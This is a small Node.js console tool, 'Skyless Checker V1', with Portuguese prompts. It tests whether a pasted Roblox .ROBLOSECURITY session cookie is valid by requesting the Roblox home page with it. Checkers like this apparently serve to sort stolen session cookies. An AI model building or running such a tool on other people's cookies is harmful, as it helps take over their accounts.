const readline = require('readline');
const https = require('https');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function printGreen(text) {
    console.log('\x1b[32m%s\x1b[0m', text);
}

function printRed(text) {
    console.log('\x1b[31m%s\x1b[0m', text);
}

function checkRobloxCookie(cookie) {
    const options = {
        hostname: 'www.roblox.com',
        path: '/home',
        method: 'GET',
        headers: {
            'Cookie': `.ROBLOSECURITY=${cookie}`
        }
    };

    const req = https.request(options, (res) => {
        if (res.statusCode === 200) {
            printGreen('Acesso concedido! Cookie válido.');
        } else {
            printRed('Acesso negado! Cookie inválido.');
        }
        showMenu();
    });

    req.on('error', (error) => {
        console.error('Erro na requisição:', error);
        showMenu();
    });

    req.end();
}

function showMenu() {
    console.log('\n\x1b[36m╭──────────────────────────────────────────────────────╮');
    console.log('│                  \x1b[35mSkyless Checker V1.0\x1b[36m          ');
    console.log('╰──────────────────────────────────────────────────────╯\x1b[0m');
    console.log('\x1b[35m1. Verificar outro cookie\x1b[0m');
    console.log('\x1b[35m2. Sair\x1b[0m');

    rl.question('\x1b[36mEscolha uma opção: \x1b[0m', (choice) => {
        if (choice === '1') {
            rl.question('\x1b[36mDigite o cookie a ser verificado: \x1b[0m', (cookie) => {
                console.log('\n\x1b[36m*****************************************************\x1b[0m\n');
                console.log('\x1b[35mVerificando o cookie...\x1b[0m\n');
                checkRobloxCookie(cookie);
            });
        } else if (choice === '2') {
            rl.close();
        } else {
            console.log('\x1b[31mOpção inválida. Tente novamente.\x1b[0m');
            showMenu();
        }
    });
}

console.log('\x1b[36m╭──────────────────────────────────────────────────────╮');
console.log('│                \x1b[36mSkyless Checker V1\x1b[36m          ');
console.log('│                                                              ');
console.log('│            \x1b[36mInsira o cookie abaixo! :)\x1b[36m                ');
console.log('│                                                              ');
console.log('╰──────────────────────────────────────────────────────╯\x1b[0m');

rl.question('\x1b[36mCookie do Roblox: \x1b[0m', (cookie) => {
    console.log('\n\x1b[36m*****************************************************\x1b[0m\n');
    console.log('\x1b[35mVerificando o cookie...\x1b[0m\n');
    checkRobloxCookie(cookie);
});
